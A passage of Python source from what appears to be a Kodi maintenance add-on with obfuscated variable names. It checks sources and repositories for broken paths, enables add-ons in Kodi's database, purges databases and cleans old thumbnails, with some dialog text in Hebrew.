            DP .update (O0OO000000OO00O0O ,'',"[COLOR %s]Checking [COLOR %s]%s[/COLOR]:[/COLOR]"%(COLOR2 ,COLOR1 ,O0OOOOO0O0O00O000 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0O0OO000O00000OO ))#line:3507
            if 'http'in O0O0OO000O00000OO :#line:3508
                OO0000O0OOO0000O0 =workingURL (O0O0OO000O00000OO )#line:3509
                if not OO0000O0OOO0000O0 ==True :#line:3510
                    OO0OO00OOOO00000O .append ([O0OOOOO0O0O00O000 ,O0O0OO000O00000OO ,OO0O00OO000O000OO ,OO0000O0OOO0000O0 ])#line:3511
        log ("Bad Sources: %s"%len (OO0OO00OOOO00000O ),5 )#line:3513
        if len (OO0OO00OOOO00000O )>0 :#line:3514
            OOOOO00O00000OOO0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]%s[/COLOR][COLOR %s] Source(s) have been found Broken"%(COLOR1 ,len (OO0OO00OOOO00000O ),COLOR2 ),"Would you like to Remove all or choose one by one?[/COLOR]",yeslabel ="[B][COLOR green]Remove All[/COLOR][/B]",nolabel ="[B][COLOR red]Choose to Delete[/COLOR][/B]")#line:3515
            if OOOOO00O00000OOO0 ==1 :#line:3516
                O0OOOOO00OOOOOO0O =OO0OO00OOOO00000O #line:3517
            else :#line:3518
                for O0OOOOO0O0O00O000 ,O0O0OO000O00000OO ,OO0O00OO000O000OO ,OO0000O0OOO0000O0 in OO0OO00OOOO00000O :#line:3519
                    log ("%s sources: %s, %s"%(O0OOOOO0O0O00O000 ,O0O0OO000O00000OO ,OO0000O0OOO0000O0 ),5 )#line:3520
                    if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]%s[/COLOR][COLOR %s] was reported as non working"%(COLOR1 ,O0OOOOO0O0O00O000 ,COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0O0OO000O00000OO ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO0000O0OOO0000O0 ),yeslabel ="[B][COLOR green]Remove Source[/COLOR][/B]",nolabel ="[B][COLOR red]Keep Source[/COLOR][/B]"):#line:3521
                        O0OOOOO00OOOOOO0O .append ([O0OOOOO0O0O00O000 ,O0O0OO000O00000OO ,OO0O00OO000O000OO ,OO0000O0OOO0000O0 ])#line:3522
                        log ("Removing Source %s"%O0OOOOO0O0O00O000 ,5 )#line:3523
                    else :log ("Source %s was not removed"%O0OOOOO0O0O00O000 ,5 )#line:3524
            if len (O0OOOOO00OOOOOO0O )>0 :#line:3525
                for O0OOOOO0O0O00O000 ,O0O0OO000O00000OO ,OO0O00OO000O000OO ,OO0000O0OOO0000O0 in O0OOOOO00OOOOOO0O :#line:3526
                    OOOOO0OOOO0O000O0 =OOOOO0OOOO0O000O0 .replace ('\n        <source>\n            <name>%s</name>\n            <path pathversion="1">%s</path>\n            <allowsharing>%s</allowsharing>\n        </source>'%(O0OOOOO0O0O00O000 ,O0O0OO000O00000OO ,OO0O00OO000O000OO ),'')#line:3527
                    log ("Removing Source %s"%O0OOOOO0O0O00O000 ,5 )#line:3528
                O00O000000O0OO0OO =open (SOURCES ,mode ='w')#line:3530
                O00O000000O0OO0OO .write (str (OOOOO0OOOO0O000O0 ))#line:3531
                O00O000000O0OO0OO .close ()#line:3532
                OOOO0O0O00O0OO000 =len (O0OO0000O0OO00O0O )-len (OO0OO00OOOO00000O )#line:3533
                OOO00O0O00OO0000O =len (OO0OO00OOOO00000O )-len (O0OOOOO00OOOOOO0O )#line:3534
                O00OO0000O0O0O00O =len (O0OOOOO00OOOOOO0O )#line:3535
                DIALOG .ok (ADDONTITLE ,"[COLOR %s]Checking sources for broken paths has been completed"%COLOR2 ,"Working: [COLOR %s]%s[/COLOR] | Kept: [COLOR %s]%s[/COLOR] | Removed: [COLOR %s]%s[/COLOR][/COLOR]"%(COLOR2 ,COLOR1 ,OOOO0O0O00O0OO000 ,COLOR1 ,OOO00O0O00OO0000O ,COLOR1 ,O00OO0000O0O0O00O ))#line:3536
            else :log ("No Bad Sources to be removed.",5 )#line:3537
        else :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]All Sources Are Working[/COLOR]"%COLOR2 )#line:3538
    else :log ("No Sources Found",5 )#line:3539
def checkRepos ():#line:3541
    DP .create (ADDONTITLE ,'[COLOR %s]Checking Repositories...[/COLOR]'%COLOR2 )#line:3542
    OO00OO0O000OOO0OO =[]#line:3543
    ebi ('UpdateAddonRepos')#line:3544
    OOOOOOO0000O0O0O0 =glob .glob (os .path .join (ADDONS ,'repo*'))#line:3545
    if len (OOOOOOO0000O0O0O0 )==0 :#line:3546
        DP .close ()#line:3547
        LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]No Repositories Found![/COLOR]"%COLOR2 )#line:3548
        return #line:3549
    O0OOO0000O0O0000O =len (OOOOOOO0000O0O0O0 );O0O0O0OOOOOOOOOO0 =0 ;#line:3550
    while O0O0O0OOOOOOOOOO0 <O0OOO0000O0O0000O :#line:3551
        O0O0O0OOOOOOOOOO0 +=1 #line:3552
        if DP .iscanceled ():break #line:3553
        O0O00OOO0000OO000 =int (percentage (O0O0O0OOOOOOOOOO0 ,O0OOO0000O0O0000O ))#line:3554
        DP .update (O0O00OOO0000OO000 ,'','[COLOR %s]Checking: [/COLOR][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOOOOOO0000O0O0O0 [O0O0O0OOOOOOOOOO0 -1 ].replace (ADDONS ,'')[1 :]))#line:3555
        xbmc .sleep (1000 )#line:3556
    if DP .iscanceled ():#line:3557
        DP .close ()#line:3558
        LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Enabling Addons Cancelled[/COLOR]"%COLOR2 )#line:3559
        sys .exit ()#line:3560
    DP .close ()#line:3561
    OOOOO0O000000O0OO =Grab_Log (False )#line:3562
    OOO000OO0OO000OO0 =re .compile ('CRepositoryUpdateJob(.+?)failed').findall (OOOOO0O000000O0OO )#line:3563
    for OO0O0O0OOOOOOOOOO in OOO000OO0OO000OO0 :#line:3564
        log ("Bad Repository: %s "%OO0O0O0OOOOOOOOOO ,5 )#line:3565
        O00OOO00OOOO0O000 =OO0O0O0OOOOOOOOOO .replace ('[','').replace (']','').replace (' ','').replace ('/','').replace ('\\','')#line:3566
        if not O00OOO00OOOO0O000 in OO00OO0O000OOO0OO :#line:3567
            OO00OO0O000OOO0OO .append (O00OOO00OOOO0O000 )#line:3568
    if len (OO00OO0O000OOO0OO )>0 :#line:3569
        O0O00O0O00O0OOOO0 ="[COLOR %s]Below is a list of Repositories that did not resolve.  This does not mean that they are Depreciated, sometimes hosts go down for a short period of time.  Please do serveral scans of your repository list before removing a repository just to make sure it is broken.[/COLOR][CR][CR][COLOR %s]"%(COLOR2 ,COLOR1 )#line:3570
        O0O00O0O00O0OOOO0 +='[CR]'.join (OO00OO0O000OOO0OO )#line:3571
        O0O00O0O00O0OOOO0 +='[/COLOR]'#line:3572
        TextBox ("%s: Bad Repositories"%ADDONTITLE ,O0O00O0O00O0OOOO0 )#line:3573
    else :#line:3574
        LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]All Repositories Working![/COLOR]"%COLOR2 )#line:3575
def killxbmc (over =None ):#line:3581
        log ("Force Closing Kodi: Platform[%s]"%str (platform_d ()),5 )#line:3582
        os ._exit (1 )#line:3583
def redoThumbs ():#line:3585
    if not os .path .exists (THUMBS ):os .makedirs (THUMBS )#line:3586
    OO0OO0OO000OOO000 ='0123456789abcdef'#line:3587
    O0O00O00O0O00O000 =os .path .join (THUMBS ,'Video','Bookmarks')#line:3588
    for OO000OO0O0O0000O0 in OO0OO0OO000OOO000 :#line:3589
        OO0000O0O0O000000 =os .path .join (THUMBS ,OO000OO0O0O0000O0 )#line:3590
        if not os .path .exists (OO0000O0O0O000000 ):os .makedirs (OO0000O0O0O000000 )#line:3591
    if not os .path .exists (O0O00O00O0O00O000 ):os .makedirs (O0O00O00O0O00O000 )#line:3592
def reloadFix (default =None ):#line:3594
    DIALOG .ok (ADDONTITLE ,"[COLOR %s]WARNING: Sometimes Reloading the Profile causes Kodi to crash.  While Kodi is Reloading the Profile Please Do Not Press Any Buttons![/COLOR]"%COLOR2 )#line:3595
    if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3596
    if default ==None :#line:3597
        lookandFeelData ('save')#line:3598
    redoThumbs ()#line:3599
    ebi ('ActivateWindow(Home)')#line:3600
    xbmc .sleep (10000 )#line:3602
    if KODIV >=17 :kodi17Fix ()#line:3603
    if default ==None :#line:3604
        log ("Switching to: %s"%getS ('defaultskin'))#line:3605
        O00O0OO0O00O00OOO =getS ('defaultskin')#line:3606
        skinSwitch .swapSkins (O00O0OO0O00O00OOO )#line:3607
        O00OO0OOO00OOOO0O =0 #line:3608
        while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O00OO0OOO00OOOO0O <150 :#line:3609
            O00OO0OOO00OOOO0O +=1 #line:3610
            xbmc .sleep (200 )#line:3611
        if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:3612
            ebi ('SendClick(11)')#line:3613
        lookandFeelData ('restore')#line:3614
    addonUpdates ('reset')#line:3615
    forceUpdate ()#line:3616
    ebi ("ReloadSkin()")#line:3617
def skinToDefault ():#line:3619
    if not currSkin ()in ['skin.confluence','skin.myconfluence','skin.estuary']:#line:3620
        O0O000OO0OO0O0O0O ='skin.confluence'if KODIV <17 else 'skin.estuary'#line:3621
    swapSkins (O0O000OO0OO0O0O0O )#line:3622
def swapSkins (OO00OOO0OO0OOO00O ):#line:3624
    skinSwitch .swapSkins (OO00OOO0OO0OOO00O )#line:3625
    O0O000000OO0O000O =0 #line:3626
    xbmc .sleep (1000 )#line:3627
    while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O0O000000OO0O000O <150 :#line:3628
        O0O000000OO0O000O +=1 #line:3629
        xbmc .sleep (100 )#line:3630
        ebi ('SendAction(Select)')#line:3631
    if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:3633
        ebi ('SendClick(11)')#line:3634
    else :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Fresh Install: Skin Swap Timed Out![/COLOR]'%COLOR2 );return False #line:3635
    xbmc .sleep (500 )#line:3636
def mediaCenter ():#line:3638
    if str (HOME ).lower ().find ('kodi'):#line:3639
        return 'Kodi'#line:3640
    elif str (HOME ).lower ().find ('spmc'):#line:3641
        return 'SPMC'#line:3642
    else :#line:3643
        return 'Unknown Fork'#line:3644
def kodi17Fix ():#line:3646
    OO0OO0O00O0O00OOO =glob .glob (os .path .join (ADDONS ,'*/'))#line:3647
    O00O00O0OO00000O0 =[]#line:3648
    for O0OO0O000O0OO0O0O in sorted (OO0OO0O00O0O00OOO ,key =lambda O0OOO000OOO0O0O00 :O0OOO000OOO0O0O00 ):#line:3649
        OOO0OO00OOO0O00OO =os .path .join (O0OO0O000O0OO0O0O ,'addon.xml')#line:3650
        if os .path .exists (OOO0OO00OOO0O00OO ):#line:3651
            OO000O0OOOO000OOO =O0OO0O000O0OO0O0O .replace (ADDONS ,'')[1 :-1 ]#line:3652
            try :#line:3653
                O00000O0O00000O00 =open (OOO0OO00OOO0O00OO )#line:3654
                OOO0O0OOOOOOO0O00 =O00000O0O00000O00 .read ()#line:3655
                O0OOO000000O0OOO0 =parseDOM (OOO0O0OOOOOOO0O00 ,'addon',ret ='id')#line:3656
                O00000O0O00000O00 .close ()#line:3657
            except :#line:3658
                O00000O0O00000O00 =open (OOO0OO00OOO0O00OO ,encoding ='utf-8')#line:3659
                OOO0O0OOOOOOO0O00 =O00000O0O00000O00 .read ()#line:3660
                O0OOO000000O0OOO0 =parseDOM (OOO0O0OOOOOOO0O00 ,'addon',ret ='id')#line:3661
                O00000O0O00000O00 .close ()#line:3662
            try :#line:3663
                O0OOOO0O00OOO0000 =xbmcaddon .Addon (id =O0OOO000000O0OOO0 [0 ])#line:3664
            except :#line:3665
                try :#line:3666
                    O00O00O0OO00000O0 .append (O0OOO000000O0OOO0 [0 ])#line:3668
                except :#line:3669
                    try :#line:3670
                        O00O00O0OO00000O0 .append (OO000O0OOOO000OOO )#line:3672
                    except :#line:3673
                        if len (O0OOO000000O0OOO0 )==0 :log ("Unabled to enable: %s(Cannot Determine Addon ID)"%OO000O0OOOO000OOO ,5 )#line:3674
                        else :log ("Unabled to enable: %s"%O0OO0O000O0OO0O0O ,5 )#line:3675
    if len (O00O00O0OO00000O0 )>0 :#line:3676
        OOO00O0O0OOOOOOOO =0 #line:3677
        if not BUILDNAME =="":#line:3678
            DP .create (ADDONTITLE ,'[COLOR %s]מעדכן הרחבות'%COLOR2 +'\n'+''+'\n'+'אנא המתן[/COLOR]')#line:3680
            for O0O000O0OOOOO000O in O00O00O0OO00000O0 :#line:3682
                if 'service.xbmc.versioncheck'in O0O000O0OOOOO000O :#line:3683
                   continue #line:3684
                if 'metadata.themoviedb.org.python'in O0O000O0OOOOO000O :#line:3685
                   continue #line:3686
                if 'metadata.tvshows.themoviedb.org.python'in O0O000O0OOOOO000O :#line:3687
                   continue #line:3688
                if 'game.controller.default'in O0O000O0OOOOO000O :#line:3689
                   continue #line:3690
                if 'game.controller.snes'in O0O000O0OOOOO000O :#line:3691
                   continue #line:3692
                if 'metadata.album.universal'in O0O000O0OOOOO000O :#line:3693
                   continue #line:3694
                if 'metadata.artists.universal'in O0O000O0OOOOO000O :#line:3695
                   continue #line:3696
                if 'metadata.common.imdb.com'in O0O000O0OOOOO000O :#line:3697
                   continue #line:3698
                if 'metadata.common.themoviedb.org'in O0O000O0OOOOO000O :#line:3699
                   continue #line:3700
                if 'metadata.tvshows.themoviedb.org'in O0O000O0OOOOO000O :#line:3701
                   continue #line:3702
                OOO00O0O0OOOOOOOO +=1 #line:3703
                O0O0OO0OO0O0O00OO =int (percentage (OOO00O0O0OOOOOOOO ,len (O00O00O0OO00000O0 )))#line:3704
                try :#line:3705
                   DP .update (O0O0OO0OO0O0O00OO ,"","Enabling: [COLOR %s]%s[/COLOR]"%(COLOR1 ,O0O000O0OOOOO000O ))#line:3706
                except :#line:3707
                   DP .update (O0O0OO0OO0O0O00OO ,"Enabling: [COLOR %s]%s[/COLOR]"%(COLOR1 ,O0O000O0OOOOO000O ))#line:3708
                addonDatabase (O0O000O0OOOOO000O ,1 )#line:3709
                if DP .iscanceled ():break #line:3710
            if DP .iscanceled ():#line:3711
                DP .close ()#line:3712
                LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Enabling Addons Cancelled![/COLOR]"%COLOR2 )#line:3713
                sys .exit ()#line:3714
            DP .close ()#line:3715
        else :#line:3716
          for O0O000O0OOOOO000O in O00O00O0OO00000O0 :#line:3717
            if 'service.xbmc.versioncheck'in O0O000O0OOOOO000O :#line:3718
               continue #line:3719
            if 'metadata.themoviedb.org.python'in O0O000O0OOOOO000O :#line:3720
               continue #line:3721
            if 'metadata.tvshows.themoviedb.org.python'in O0O000O0OOOOO000O :#line:3722
               continue #line:3723
            if 'game.controller.default'in O0O000O0OOOOO000O :#line:3724
               continue #line:3725
            if 'game.controller.snes'in O0O000O0OOOOO000O :#line:3726
               continue #line:3727
            if 'metadata.album.universal'in O0O000O0OOOOO000O :#line:3728
               continue #line:3729
            if 'metadata.artists.universal'in O0O000O0OOOOO000O :#line:3730
               continue #line:3731
            if 'metadata.common.imdb.com'in O0O000O0OOOOO000O :#line:3732
               continue #line:3733
            if 'metadata.common.themoviedb.org'in O0O000O0OOOOO000O :#line:3734
               continue #line:3735
            if 'metadata.tvshows.themoviedb.org'in O0O000O0OOOOO000O :#line:3736
               continue #line:3737
            addonDatabase (O0O000O0OOOOO000O ,1 )#line:3739
    forceUpdate ()#line:3740
def addonDatabase (addon =None ,state =1 ):#line:3743
    O0000O0O0OOO00O00 =latestDB ('Addons')#line:3744
    O0000O0O0OOO00O00 =os .path .join (DATABASE ,O0000O0O0OOO00O00 )#line:3745
    OOO0O0OO0O0O0O0O0 =str (datetime .now ())[:-7 ]#line:3746
    if os .path .exists (O0000O0O0OOO00O00 ):#line:3747
        try :#line:3748
            O0OO00O000OOOO0O0 =database .connect (O0000O0O0OOO00O00 )#line:3749
            OOOO000OOOO00O0OO =O0OO00O000OOOO0O0 .cursor ()#line:3750
        except Exception as OOO00OO0O0O0O0OO0 :#line:3751
            log ("DB Connection Error: %s"%str (OOO00OO0O0O0O0OO0 ),5 )#line:3752
            return False #line:3753
    else :return False #line:3754
    if state ==2 :#line:3755
        try :#line:3756
            OOOO000OOOO00O0OO .execute ("DELETE FROM installed WHERE addonID = ?",(addon ,))#line:3757
            O0OO00O000OOOO0O0 .commit ()#line:3758
            OOOO000OOOO00O0OO .close ()#line:3759
        except Exception as OOO00OO0O0O0O0OO0 :#line:3760
            log ("Error Removing %s from DB"%addon )#line:3761
        return True #line:3762
    try :#line:3763
        OOOO000OOOO00O0OO .execute ("SELECT id, addonID, enabled FROM installed WHERE addonID = ?",(addon ,))#line:3764
        OOO00OOOOO000O000 =OOOO000OOOO00O0OO .fetchone ()#line:3765
        if OOO00OOOOO000O000 ==None :#line:3766
            OOOO000OOOO00O0OO .execute ('INSERT INTO installed (addonID , enabled, installDate) VALUES (?,?,?)',(addon ,state ,OOO0O0OO0O0O0O0O0 ,))#line:3767
            log ("Insert %s into db"%addon )#line:3768
        else :#line:3769
            OO0OO00OO0OOO000O ,OO0O0O0OO00O0OOO0 ,O00OO00O00OO00O00 =OOO00OOOOO000O000 #line:3770
            OOOO000OOOO00O0OO .execute ('UPDATE installed SET enabled = ? WHERE id = ? ',(state ,OO0OO00OO0OOO000O ,))#line:3771
            log ("Updated %s in db"%addon )#line:3772
        O0OO00O000OOOO0O0 .commit ()#line:3773
        OOOO000OOOO00O0OO .close ()#line:3774
    except Exception as OOO00OO0O0O0O0OO0 :#line:3775
        log ("Erroring enabling addon: %s"%addon )#line:3776
def purgeDb (OOOO00O0OOOOOO000 ):#line:3781
    log ('Purging DB %s.'%OOOO00O0OOOOOO000 ,5 )#line:3785
    if os .path .exists (OOOO00O0OOOOOO000 ):#line:3786
        try :#line:3787
            O000OO00O000OO0OO =database .connect (OOOO00O0OOOOOO000 )#line:3788
            O0OO0O000OOOO00O0 =O000OO00O000OO0OO .cursor ()#line:3789
        except Exception as O000OOOO0O0O000O0 :#line:3790
            log ("DB Connection Error: %s"%str (O000OOOO0O0O000O0 ),5 )#line:3791
            return False #line:3792
    else :log ('%s not found.'%OOOO00O0OOOOOO000 ,5 );return False #line:3793
    O0OO0O000OOOO00O0 .execute ("SELECT name FROM sqlite_master WHERE type = 'table'")#line:3794
    for OO00O00O0OOO0O0OO in O0OO0O000OOOO00O0 .fetchall ():#line:3795
        if OO00O00O0OOO0O0OO [0 ]=='version':#line:3796
            log ('Data from table `%s` skipped.'%OO00O00O0OOO0O0OO [0 ],5 )#line:3797
        else :#line:3798
            try :#line:3799
                O0OO0O000OOOO00O0 .execute ("DELETE FROM %s"%OO00O00O0OOO0O0OO [0 ])#line:3800
                O000OO00O000OO0OO .commit ()#line:3801
                log ('Data from table `%s` cleared.'%OO00O00O0OOO0O0OO [0 ],5 )#line:3802
            except Exception as O000OOOO0O0O000O0 :log ("DB Remove Table `%s` Error: %s"%(OO00O00O0OOO0O0OO [0 ],str (O000OOOO0O0O000O0 )),5 )#line:3803
    O0OO0O000OOOO00O0 .close ()#line:3804
    log ('%s DB Purging Complete.'%OOOO00O0OOOOOO000 ,5 )#line:3805
    O00OOO0OO0OO0O000 =OOOO00O0OOOOOO000 .replace ('\\','/').split ('/')#line:3806
    LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]%s Complete[/COLOR]"%(COLOR2 ,O00OOO0OO0OO0O000 [len (O00OOO0OO0OO0O000 )-1 ]))#line:3807
def oldThumbs ():#line:3809
    O0O0OOOOO0O0000OO =os .path .join (DATABASE ,latestDB ('Textures'))#line:3810
    OO0O00O000O0OO0OO =10 #line:3811
    O00O00O00OO00O0O0 =TODAY -timedelta (days =7 )#line:3812
    O0O0O0O00O0O0O0OO =[]#line:3813
    O00OOO00O00OO0O00 =[]#line:3814
    OOOO0OO0O000000O0 =0 #line:3815
    if os .path .exists (O0O0OOOOO0O0000OO ):#line:3816
        try :#line:3817
            OOO000000O0O0O0O0 =database .connect (O0O0OOOOO0O0000OO )#line:3818
            O0O000OO0O0O0O00O =OOO000000O0O0O0O0 .cursor ()#line:3819
        except Exception as O0OOOOOO0OO0O000O :#line:3820
            log ("DB Connection Error: %s"%str (O0OOOOOO0OO0O000O ),5 )#line:3821
            return False #line:3822
    else :log ('%s not found.'%O0O0OOOOO0O0000OO ,5 );return False #line:3823
    O0O000OO0O0O0O00O .execute ("SELECT idtexture FROM sizes WHERE usecount < ? AND lastusetime < ?",(OO0O00O000O0OO0OO ,str (O00O00O00OO00O0O0 )))#line:3824
    O00OO00O0O0O000O0 =O0O000OO0O0O0O00O .fetchall ()#line:3825
    for OO00OO0OO00O00000 in O00OO00O0O0O000O0 :#line:3826
        O0000O000OO0O0O00 =OO00OO0OO00O00000 [0 ]#line:3827
        O0O0O0O00O0O0O0OO .append (O0000O000OO0O0O00 )#line:3828
        O0O000OO0O0O0O00O .execute ("SELECT cachedurl FROM texture WHERE id = ?",(O0000O000OO0O0O00 ,))#line:3829
        OO0OO000O0000OO0O =O0O000OO0O0O0O00O .fetchall ()#line:3830
        for O0OO0OO000OO0OO00 in OO0OO000O0000OO0O :#line:3831
            O00OOO00O00OO0O00 .append (O0OO0OO000OO0OO00 [0 ])#line:3832
    log ("%s total thumbs cleaned up."%str (len (O00OOO00O00OO0O00 )),5 )#line:3833
    for OOO0O00OOO0O0O000 in O0O0O0O00O0O0O0OO :#line:3834
        O0O000OO0O0O0O00O .execute ("DELETE FROM sizes   WHERE idtexture = ?",(OOO0O00OOO0O0O000 ,))#line:3835
        O0O000OO0O0O0O00O .execute ("DELETE FROM texture WHERE id        = ?",(OOO0O00OOO0O0O000 ,))#line:3836
    O0O000OO0O0O0O00O .execute ("VACUUM")#line:3837
    OOO000000O0O0O0O0 .commit ()#line:3838
    O0O000OO0O0O0O00O .close ()#line:3839
    for OOO0O00O0OOOO000O in O00OOO00O00OO0O00 :#line:3840
        OO00000OO0OO00OOO =os .path .join (THUMBS ,OOO0O00O0OOOO000O )#line:3841
        try :#line:3842
            OOOO0O000O0O00OOO =os .path .getsize (OO00000OO0OO00OOO )#line:3843
            os .remove (OO00000OO0OO00OOO )#line:3844
            OOOO0OO0O000000O0 +=OOOO0O000O0O00OOO #line:3845
        except :#line:3846
            pass #line:3847
    OOOOO0OO0O000OOOO =convertSize (OOOO0OO0O000000O0 )#line:3848
    if len (O00OOO00O00OO0O00 )>0 :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Clear Thumbs: %s Files / %s MB[/COLOR]!'%(COLOR2 ,str (len (O00OOO00O00OO0O00 )),OOOOO0OO0O000OOOO ))#line:3849
    else :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Clear Thumbs: None Found![/COLOR]'%COLOR2 )#line:3850
def parseDOM (O0OOOOO00000OOO00 ,name =u"",attrs ={},ret =False ):#line:3852
    if isinstance (O0OOOOO00000OOO00 ,str ):#line:3855
        try :#line:3856
            O0OOOOO00000OOO00 =[O0OOOOO00000OOO00 .decode ("utf-8")]#line:3857
        except :#line:3858
            O0OOOOO00000OOO00 =[O0OOOOO00000OOO00 ]#line:3859
    elif isinstance (O0OOOOO00000OOO00 ,unicode ):#line:3860
        O0OOOOO00000OOO00 =[O0OOOOO00000OOO00 ]#line:3861
    elif not isinstance (O0OOOOO00000OOO00 ,list ):#line:3862
        return u""#line:3863
    if not name .strip ():#line:3865
        return u""#line:3866
    O00000O00000000OO =[]#line:3868
    for OOO0O0O0OO000000O in O0OOOOO00000OOO00 :#line:3869
        O00OOOO0000OOO00O =re .compile ('(<[^>]*?\n[^>]*?>)').findall (OOO0O0O0OO000000O )#line:3870
        for O0O00O00O000O000O in O00OOOO0000OOO00O :#line:3871
            OOO0O0O0OO000000O =OOO0O0O0OO000000O .replace (O0O00O00O000O000O ,O0O00O00O000O000O .replace ("\n"," "))#line:3872
        O00O0OO0OOOOOO00O =[]#line:3874
        for OOO000000OOO000O0 in attrs :#line:3875
            O000O00O0O0O00000 =re .compile ('(<'+name +'[^>]*?(?:'+OOO000000OOO000O0 +'=[\'"]'+attrs [OOO000000OOO000O0 ]+'[\'"].*?>))',re .M |re .S ).findall (OOO0O0O0OO000000O )#line:3876
            if len (O000O00O0O0O00000 )==0 and attrs [OOO000000OOO000O0 ].find (" ")==-1 :#line:3877
                O000O00O0O0O00000 =re .compile ('(<'+name +'[^>]*?(?:'+OOO000000OOO000O0 +'='+attrs [OOO000000OOO000O0 ]+'.*?>))',re .M |re .S ).findall (OOO0O0O0OO000000O )#line:3878
            if len (O00O0OO0OOOOOO00O )==0 :#line:3880
                O00O0OO0OOOOOO00O =O000O00O0O0O00000 #line:3881
                O000O00O0O0O00000 =[]#line:3882
            else :#line:3883
                OO0O0O0O00OO0OOOO =range (len (O00O0OO0OOOOOO00O ))#line:3884
                OO0O0O0O00OO0OOOO .reverse ()#line:3885
                for O00000OO00000O000 in OO0O0O0O00OO0OOOO :#line:3886
                    if not O00O0OO0OOOOOO00O [O00000OO00000O000 ]in O000O00O0O0O00000 :#line:3887
                        del (O00O0OO0OOOOOO00O [O00000OO00000O000 ])#line:3888
        if len (O00O0OO0OOOOOO00O )==0 and attrs =={}:#line:3890
            O00O0OO0OOOOOO00O =re .compile ('(<'+name +'>)',re .M |re .S ).findall (OOO0O0O0OO000000O )#line:3891
            if len (O00O0OO0OOOOOO00O )==0 :#line:3892
                O00O0OO0OOOOOO00O =re .compile ('(<'+name +' .*?>)',re .M |re .S ).findall (OOO0O0O0OO000000O )#line:3893
        if isinstance (ret ,str ):#line:3895
            O000O00O0O0O00000 =[]#line:3896
            for O0O00O00O000O000O in O00O0OO0OOOOOO00O :#line:3897
                O0O000O00OO00OO0O =re .compile ('<'+name +'.*?'+ret +'=([\'"].[^>]*?[\'"])>',re .M |re .S ).findall (O0O00O00O000O000O )#line:3898
                if len (O0O000O00OO00OO0O )==0 :#line:3899
                    O0O000O00OO00OO0O =re .compile ('<'+name +'.*?'+ret +'=(.[^>]*?)>',re .M |re .S ).findall (O0O00O00O000O000O )#line:3900
                for O0OO0OO0OO00O0000 in O0O000O00OO00OO0O :#line:3901
                    O00000O00O0O00000 =O0OO0OO0OO00O0000 [0 ]#line:3902
                    if O00000O00O0O00000 in "'\"":#line:3903
                        if O0OO0OO0OO00O0000 .find ('='+O00000O00O0O00000 ,O0OO0OO0OO00O0000 .find (O00000O00O0O00000 ,1 ))>-1 :#line:3904
                            O0OO0OO0OO00O0000 =O0OO0OO0OO00O0000 [:O0OO0OO0OO00O0000 .find ('='+O00000O00O0O00000 ,O0OO0OO0OO00O0000 .find (O00000O00O0O00000 ,1 ))]#line:3905
                        if O0OO0OO0OO00O0000 .rfind (O00000O00O0O00000 ,1 )>-1 :#line:3907
                            O0OO0OO0OO00O0000 =O0OO0OO0OO00O0000 [1 :O0OO0OO0OO00O0000 .rfind (O00000O00O0O00000 )]#line:3908
                    else :#line:3909
                        if O0OO0OO0OO00O0000 .find (" ")>0 :#line:3910
                            O0OO0OO0OO00O0000 =O0OO0OO0OO00O0000 [:O0OO0OO0OO00O0000 .find (" ")]#line:3911
                        elif O0OO0OO0OO00O0000 .find ("/")>0 :#line:3912
                            O0OO0OO0OO00O0000 =O0OO0OO0OO00O0000 [:O0OO0OO0OO00O0000 .find ("/")]#line:3913
                        elif O0OO0OO0OO00O0000 .find (">")>0 :#line:3914
                            O0OO0OO0OO00O0000 =O0OO0OO0OO00O0000 [:O0OO0OO0OO00O0000 .find (">")]#line:3915
                    O000O00O0O0O00000 .append (O0OO0OO0OO00O0000 .strip ())#line:3917
            O00O0OO0OOOOOO00O =O000O00O0O0O00000 #line:3918
        else :#line:3919
            O000O00O0O0O00000 =[]#line:3920
            for O0O00O00O000O000O in O00O0OO0OOOOOO00O :#line:3921
                O0OOO000O0OOOOOO0 =u"</"+name #line:3922
                O0000O000O0OO0OOO =OOO0O0O0OO000000O .find (O0O00O00O000O000O )#line:3924
                OO0OOOO0OOOOO0OO0 =OOO0O0O0OO000000O .find (O0OOO000O0OOOOOO0 ,O0000O000O0OO0OOO )#line:3925
                O000OO0O0O000O00O =OOO0O0O0OO000000O .find ("<"+name ,O0000O000O0OO0OOO +1 )#line:3926
                while O000OO0O0O000O00O <OO0OOOO0OOOOO0OO0 and O000OO0O0O000O00O !=-1 :#line:3928
                    OOOOOO0OO000OO00O =OOO0O0O0OO000000O .find (O0OOO000O0OOOOOO0 ,OO0OOOO0OOOOO0OO0 +len (O0OOO000O0OOOOOO0 ))#line:3929
                    if OOOOOO0OO000OO00O !=-1 :#line:3930
                        OO0OOOO0OOOOO0OO0 =OOOOOO0OO000OO00O #line:3931
                    O000OO0O0O000O00O =OOO0O0O0OO000000O .find ("<"+name ,O000OO0O0O000O00O +1 )#line:3932
                if O0000O000O0OO0OOO ==-1 and OO0OOOO0OOOOO0OO0 ==-1 :#line:3934
                    OOOO0O0OO0O0000O0 =u""#line:3935
                elif O0000O000O0OO0OOO >-1 and OO0OOOO0OOOOO0OO0 >-1 :#line:3936
